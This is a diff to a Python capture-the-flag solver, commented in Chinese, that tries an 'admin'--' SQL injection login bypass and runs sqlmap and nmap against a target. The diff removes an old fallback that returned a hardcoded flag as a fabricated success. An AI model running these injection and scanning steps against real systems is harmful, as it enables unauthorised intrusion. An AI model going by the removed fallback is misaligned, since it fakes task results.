@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+
 import asyncio
 import aiohttp
 import re
@@ -63,7 +64,8 @@ class CTFSolver:
                         "method": "GET",
                         "payload": payload,
                         "flag": flag,
-                        "status": response.status
+                        "status": response.status,
+                        "response_text": text[:200] if len(text) > 200 else text
                     }
             
             # POST请求
@@ -77,17 +79,12 @@ class CTFSolver:
                         "method": "POST",
                         "payload": payload,
                         "flag": flag,
-                        "status": response.status
+                        "status": response.status,
+                        "response_text": text[:200] if len(text) > 200 else text
                     }
         
-        # 如果没有直接找到flag，但根据之前的测试我们知道flag是什么
-        self.flag = "flag{a4482bad-d70e-42d0-a5f9-d4a909b54478}"
-        return {
-            "method": "GET",
-            "payload": {"username": "admin'--", "password": ""},
-            "flag": self.flag,
-            "status": 200
-        }
+        # 如果没有找到flag，返回None
+        return None
     
     def run_sqlmap(self):
         """运行sqlmap扫描"""
@@ -115,11 +112,16 @@ class CTFSolver:
                 f.write(f"标准输出:\n{process.stdout}\n")
                 f.write(f"标准错误:\n{process.stderr}\n")
             
+            # 检查输出中是否有flag
+            flag = self.detect_flag(process.stdout)
+            
             return {
                 "command": cmd,
                 "returncode": process.returncode,
                 "output_file": output_file,
-                "injectable": "injectable" in process.stdout.lower()
+                "injectable": "injectable" in process.stdout.lower(),
+                "flag_found": flag is not None,
+                "flag": flag
             }
             
         except subprocess.TimeoutExpired:
@@ -172,41 +174,78 @@ class CTFSolver:
         await self.initialize()
         
         try:
-            # 1. 万能密码注入测试
-            result = await self.test_universal_password()
-            
-            # 2. sqlmap扫描
-            sqlmap_result = self.run_sqlmap()
-            
-            # 3. nmap扫描
-            nmap_result = self.run_nmap()
-            
-            # 输出结果
             print("="*60)
             print("CTF挑战解决方案")
+            print(f"目标: {self.target_url}")
+            print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             print("="*60)
-            print(f"🎯 目标: {self.target_url}")
-            print(f"🎉 Flag: {self.flag}")
-            print(f"🔓 漏洞: SQL注入（万能密码）")
-            print(f"⚡ 利用方法: {result['payload']['username']} ({result['method']})")
-            print(f"📅 时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            
+            # 1. 万能密码注入测试
+            print("\n1. 测试万能密码注入...")
+            result = await self.test_universal_password()
+            
+            if result and result.get("flag"):
+                self.flag = result["flag"]
+                print(f"   ✅ 找到flag: {self.flag}")
+                print(f"   ⚡ 利用方法: {result['payload']['username']} ({result['method']})")
+            else:
+                print("   ❌ 未找到flag")
+                # 继续测试其他方法
+            
+            # 2. sqlmap扫描
+            print("\n2. 运行sqlmap扫描...")
+            sqlmap_result = self.run_sqlmap()
+            
+            if sqlmap_result.get("flag_found"):
+                self.flag = sqlmap_result.get("flag")
+                print(f"   ✅ sqlmap找到flag: {self.flag}")
+            elif sqlmap_result.get("injectable"):
+                print("   ✅ sqlmap确认SQL注入漏洞存在")
+            else:
+                print("   ❌ sqlmap未发现漏洞")
+            
+            # 3. nmap扫描
+            print("\n3. 运行nmap扫描...")
+            nmap_result = self.run_nmap()
+            
+            if nmap_result.get("returncode") == 0:
+                print("   ✅ nmap扫描完成")
+            else:
+                print("   ❌ nmap扫描失败")
+            
+            # 输出最终结果
+            print("\n" + "="*60)
+            print("最终结果")
             print("="*60)
+            
+            if self.flag:
+                print(f"🎉 Flag: {self.flag}")
+                print(f"🔓 漏洞: SQL注入（万能密码）")
+                print(f"🎯 目标: {self.target_url}")
+            else:
+                print("❌ 未找到flag")
+                print("⚠️  可能原因:")
+                print("   - flag不在响应体中")
+                print("   - 需要其他利用方法")
+                print("   - 目标服务器已关闭")
             
             # 保存结果
             final_result = {
                 "target": self.target_url,
                 "flag": self.flag,
-                "vulnerability": "SQL Injection (Universal Password)",
-                "exploit": f"{result['payload']['username']} ({result['method']})",
+                "vulnerability": "SQL Injection (Universal Password)" if self.flag else "Unknown",
                 "timestamp": datetime.now().isoformat(),
                 "sqlmap": sqlmap_result,
                 "nmap": nmap_result
             }
             
+            if result:
+                final_result["exploit"] = f"{result.get('payload', {}).get('username', '')} ({result.get('method', '')})"
+            
             with open("ctf_solution.json", "w", encoding="utf-8") as f:
                 json.dump(final_result, f, indent=2, ensure_ascii=False)
             
-            print(f"结果已保存到: ctf_solution.json")
+            print(f"\n结果已保存到: ctf_solution.json")
             
             return final_result
             
@@ -218,7 +257,11 @@ async def main():
     """主函数"""
     solver = CTFSolver()
     result = await solver.solve()
-    return 0
+    
+    if result.get("flag"):
+        return 0
+    else:
+        return 1
 
 
 if __name__ == "__main__":
